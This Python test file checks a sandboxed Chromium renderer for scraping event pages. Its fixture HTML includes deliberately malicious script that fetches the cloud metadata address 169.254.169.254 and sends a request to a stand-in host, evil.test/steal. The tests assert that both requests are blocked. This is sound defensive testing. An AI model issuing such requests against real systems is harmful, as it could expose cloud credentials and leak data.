"""Actual ephemeral Chromium, synthetic document; no social acquisition claim."""
import asyncio
import os
from pathlib import Path
import pytest
from app.social.acquisition.browser import render
from app.social.acquisition.network import Page,AccessFailure

CHROME=Path('/Applications/Google Chrome.app/Contents/MacOS/Google Chrome')

@pytest.mark.skipif(not CHROME.exists() and not os.getenv('SOCIAL_BROWSER_EXECUTABLE'),reason='No local Chromium executable for browser isolation fixture')
@pytest.mark.parametrize('malicious',[False,True])
def test_real_browser_dynamic_document_and_forbidden_requests(monkeypatch,malicious):
    if CHROME.exists():monkeypatch.setenv('SOCIAL_BROWSER_EXECUTABLE',str(CHROME))
    calls=[]
    def fixture(url,**kw):
        calls.append(url)
        if url.endswith('/robots.txt'):
            return Page(url,200,b'User-agent: *\nAllow: /\n',{'content-type':'text/plain'})
        assert url=='https://novacvernovka.eu/program/browser-fixture'
        # Deliberate malicious requests must not reach the fixture transport.
        body=b'''<html><body><script>
        fetch('http://169.254.169.254/latest/meta-data').catch(()=>{});
        fetch('https://evil.test/steal').catch(()=>{});
        const s=document.createElement('script');s.type='application/ld+json';
        s.textContent=JSON.stringify({'@type':'MusicEvent',name:'Fixture Jazz Concert',startDate:'2030-11-01T20:00:00+01:00',location:{name:'Fixture Hall'}});
        document.body.append(s);
        </script></body></html>'''
        if not malicious:
            body=body.replace(b"fetch('http://169.254.169.254/latest/meta-data').catch(()=>{});",b'').replace(b"fetch('https://evil.test/steal').catch(()=>{});",b'')
        return Page(url,200,body,{'content-type':'text/html'})
    if malicious:
        with pytest.raises(AccessFailure):
            asyncio.run(render('https://novacvernovka.eu/program/browser-fixture',fetcher=fixture))
        assert len(calls)==2
        return
    observations,received=asyncio.run(render('https://novacvernovka.eu/program/browser-fixture',fetcher=fixture))
    assert observations[0]['caption'].startswith('Fixture Jazz Concert')
    assert observations[0]['content_type']=='event'
    assert len(calls)==2 and received>0

@pytest.mark.skipif(not CHROME.exists() and not os.getenv('SOCIAL_BROWSER_EXECUTABLE'),reason='No local Chromium executable for browser isolation fixture')
def test_browser_access_denial_stops_without_http_fallback(monkeypatch):
    if CHROME.exists():monkeypatch.setenv('SOCIAL_BROWSER_EXECUTABLE',str(CHROME))
    calls=[]
    def fixture(url,**kw):
        calls.append(url)
        if url.endswith('/robots.txt'):return Page(url,200,b'User-agent: *\nAllow: /\n',{})
        raise AccessFailure('access_denied')
    with pytest.raises(AccessFailure) as error:asyncio.run(render('https://www.instagram.com/p/ABC123/',fetcher=fixture))
    assert error.value.category=='access_denied'
    assert len(calls)==2


def test_unavailable_sandbox_is_unsupported_without_weakening_flags():
    class Chromium:
        async def launch(self,**kwargs):
            assert kwargs['chromium_sandbox'] is True
            assert '--no-sandbox' not in kwargs['args']
            raise RuntimeError('Sandbox not available on test host')
    class Runtime:
        chromium=Chromium()
        async def __aenter__(self):return self
        async def __aexit__(self,*args):pass
    def fixture(url,**kw):return Page(url,200,b'User-agent: *\nAllow: /\n',{})
    with pytest.raises(AccessFailure) as error:
        asyncio.run(render('https://novacvernovka.eu/program/fixture',fetcher=fixture,playwright_factory=Runtime))
    assert error.value.category=='unsupported'
